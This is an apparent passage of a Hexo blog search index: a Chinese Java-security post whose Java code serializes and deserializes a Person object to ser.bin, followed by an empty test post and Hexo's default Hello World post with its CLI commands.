class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        serialize(person);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化的过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        System.out.println(obj);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ser.bin内容</p><p><img src="/2023/10/17/2023-10-17-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20231017152940263-1697527793094-1.png" alt="image-20231017152940263"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2023/10/16/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2023/10/16/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/16/hello-world/"/>
    <url>/2023/10/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
